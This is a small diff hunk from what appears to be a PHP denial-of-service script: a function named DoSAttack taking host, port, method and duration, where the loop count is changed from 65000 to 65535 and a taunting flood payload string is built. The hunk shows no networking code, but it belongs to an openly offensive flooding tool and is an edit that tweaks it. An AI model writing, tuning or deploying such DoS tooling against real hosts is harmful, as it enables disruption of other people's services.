@@ -21,7 +21,7 @@ function DoSAttack($host, $port, $method, $time){
 	$time = time()+$time;
 	$packets = 0;
 
-	for($i=0;$i<65000;$i++){
+	for($i=0;$i<65535;$i++){
 		$out = 'G1T DD0S3D B1TCH ';
     }
 
